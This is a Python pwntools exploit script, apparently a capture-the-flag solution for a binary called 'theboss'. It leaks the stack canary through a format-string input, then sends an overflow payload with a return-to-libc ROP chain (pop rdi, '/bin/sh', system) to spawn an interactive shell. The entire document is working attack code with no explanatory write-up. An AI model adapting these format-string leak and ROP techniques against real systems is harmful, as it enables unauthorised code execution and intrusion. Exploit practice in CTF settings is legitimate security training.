#!/usr/bin/python3

from pwn import *

elf = ELF("./theboss")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rop_elf = ROP(elf)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)

    return process(elf.path)

# Helper i/o functions:
def leak(data):
    p.sendlineafter(b">>\n", b"1")
    p.sendlineafter(b"term: \n", data)
    
    p.recvline()
    p.recvline()
    return p.recvline()

def set_flag(data):
    p.sendlineafter(b">>\n", b"3")
    p.sendlineafter(b"overdo it!\n", data)

def get_shell(data):
    p.sendlineafter(b">>\n", b"4")
    p.sendlineafter(b"!\n", data)

p = start()

# No aslr so glibc static!
libc.address = 0x00007ffff7ddf000

# Automate the canary leak:
#for i in range(0, 50):
#    print(leak(b"%" + str(i).encode() + b"$p") + b" " + str(i).encode())

canary = int(leak(b"%9$p"), 16)
log.info(f"The canary: {hex(canary)}")

set_flag(b"tsiou,tsiou")

ret = p64(rop_elf.find_gadget(['ret'])[0])
pop_rdi = p64(rop_elf.find_gadget(['pop rdi', 'ret'])[0])
binsh = p64(next(libc.search(b"/bin/sh\x00")))
system = p64(libc.sym.system)

payload = b"a"*72 + p64(canary) + ret + pop_rdi + binsh + system

get_shell(payload)

p.interactive()


